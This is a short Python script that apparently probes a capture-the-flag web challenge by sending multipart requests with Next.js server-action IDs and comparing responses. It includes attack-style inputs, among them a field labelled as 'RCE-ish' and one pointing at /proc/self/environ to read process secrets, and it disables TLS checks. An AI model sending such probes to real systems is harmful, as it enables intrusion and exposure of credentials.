#!/usr/bin/env python3
"""
Verify whether the MPA action is being executed by:
1. Sending invalid $ACTION_ID_ (wrong id) -- should produce a different response (404 or error).
2. Sending a valid $ACTION_ID_ and one with extra fields.
3. Looking at response body length variation closely - maybe a tiny diff in dynamic ID.
"""
import urllib.request, urllib.error, ssl, hashlib

URL = "https://funicular-gm2cxozn.alfactf.ru/"
ACTION_ID = "40c6382106bb726484f31b3ebc21b7476819a1cccf"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE


def fetch(method, headers=None, body=None):
    r = urllib.request.Request(URL, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(r, context=ctx, timeout=30) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()


def multipart(fields):
    boundary = "----X1234ABC"
    parts = []
    for k, v in fields:
        parts.append(f"--{boundary}\r\n".encode())
        parts.append(f'Content-Disposition: form-data; name="{k}"\r\n\r\n'.encode())
        parts.append(v.encode() if isinstance(v, str) else v)
        parts.append(b"\r\n")
    parts.append(f"--{boundary}--\r\n".encode())
    return boundary, b"".join(parts)


# Wrong action id (42 chars but invalid hex)
WRONG_ID = "0" * 42

for label, fields in [
    ("plain GET", None),  # baseline
    ("MPA valid", [(f"$ACTION_ID_{ACTION_ID}", "")]),
    ("MPA wrong id (zeros)", [(f"$ACTION_ID_{WRONG_ID}", "")]),
    ("MPA wrong id (real hex)", [(f"$ACTION_ID_{'a'*42}", "")]),
    ("MPA + filename triggering RCE-ish", [(f"$ACTION_ID_{ACTION_ID}", ""), ("packet", "south-line")]),
    ("MPA + script param", [(f"$ACTION_ID_{ACTION_ID}", ""), ("script", "/proc/self/environ")]),
]:
    if fields is None:
        s, h, d = fetch("GET")
    else:
        boundary, body = multipart(fields)
        s, h, d = fetch("POST", {"Content-Type": f"multipart/form-data; boundary={boundary}"}, body)
    sha = hashlib.sha256(d).hexdigest()[:12]
    print(f"{label:40s} status={s} len={len(d)} sha={sha}")
    if s >= 400:
        print(" body:", d[:300])
